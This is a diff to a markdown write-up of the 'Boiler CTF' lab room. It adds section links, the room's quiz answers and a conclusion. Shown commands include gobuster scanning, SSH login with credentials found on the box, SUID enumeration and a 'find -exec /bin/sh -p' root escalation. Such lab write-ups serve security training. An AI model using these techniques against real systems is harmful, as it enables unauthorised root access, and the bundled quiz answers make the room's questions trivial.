@@ -8,6 +8,13 @@
 ## Summary
 
 - [Nmap scan](#nmap-scan)
+- [FTP enumeration](#ftp-enumeration)
+- [Port 10000 enumeration](#port-10000-enumeration)
+- [Port 80 enumeration](#port-80-enumeration)
+- [Exploiting sar2html](#exploiting-sar2html)
+- [Linux enumeration](#linux-enumeration)
+- [Privilege escalation](#privilege-escalation)
+- [Conclusion](#conclusion)
 
 ## Nmap scan
 
@@ -137,7 +144,7 @@ So there is a CMS installed on port 80.
 **Question : What's CMS can you access ?**  
 **Answer : joomla**  
 
-Let's run another gobuster scan against `/joomla` directory :  
+Let's run another [gobuster](https://github.com/OJ/gobuster) scan against `/joomla` directory :  
 ```
 attacker@AttackBox:~/Boiler_CTF$ gobuster dir -u http://10.10.100.67/joomla/ -w /usr/share/wordlists/dirb/big.txt -o gobusterResults.txt
 ===============================================================
@@ -186,6 +193,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 If we go take a look at `_test` directory, we can see that sar2html is installed :  
 ![](https://i.imgur.com/Y0c9AeN.jpg)  
+
+## Exploiting sar2html
 
 This web application is vulnerable to an [RCE](https://www.exploit-db.com/exploits/47204). Let's run a listener on our machine in order to get a reverse shell :  
 ```
@@ -304,6 +313,9 @@ else
 fi
 ```
 
+**Question : Where was the other users pass stored(no extension, just the name) ?**  
+**Answer : backup**  
+
 There is a password for user `stoner` ! Let's use those credentials to log in on SSH again, maybe we will have more privileges :  
 ```
 attacker@AttackBox:~/Boiler_CTF$ ssh stoner@10.10.100.67 -p 55007
@@ -343,6 +355,9 @@ stoner@Vulnerable:~$ cat .secret
 *********************************
 ```
 
+**Question : user.txt**  
+**Answer : *HIDDEN***  
+
 Now, let's see if we have any sudo rights :  
 ```
 stoner@Vulnerable:~$ sudo -l
@@ -380,13 +395,15 @@ stoner@Vulnerable:/var/backups$ find / -type f -perm -4000 2>/dev/null
 
 ## Privilege escalation
 
-Binary `find` has the SUID and it should have it. We can use this to get a shell as root since this binary is owned by root :  
+Binary `find` has the SUID and it should have it. We can use this to get a shell as root since this binary is owned by root (https://gtfobins.github.io/gtfobins/find/) :  
 ```
 stoner@Vulnerable:/var/backups$ find . -exec /bin/sh -p \; -quit
 # whoami
 root
-#
 ```
+
+**Question : What did you exploit to get the privileged user ?**  
+**Answer : find**  
 
 We are root ! Let's get the root flag :  
 ```
@@ -395,8 +412,18 @@ We are root ! Let's get the root flag :
 root.txt
 # cat root.txt
 *******************
-#
 ```
+
+**Question : root.txt**  
+**Answer : *HIDDEN***  
 
 ## Conclusion
 
+In this room, we practiced :  
+- Services and ports enumeration using [nmap](https://nmap.org/book/man.html)
+- FTP enumeration
+- Web enumeration using [gobuster](https://github.com/OJ/gobuster)
+- Basic linux enumeration
+- Privilege escalation using a SUID binary
+
+Thanks for this room and thanks for reading my write ups !
